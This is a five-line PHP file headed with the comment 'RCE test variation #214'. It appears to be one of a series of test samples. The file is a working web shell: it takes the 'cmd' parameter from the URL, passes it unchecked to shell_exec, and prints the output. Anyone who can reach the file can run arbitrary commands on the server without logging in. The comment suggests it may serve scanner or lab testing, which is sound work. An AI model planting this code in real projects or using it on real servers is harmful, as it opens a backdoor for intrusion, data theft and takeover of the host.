<?php
// RCE test variation #214
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>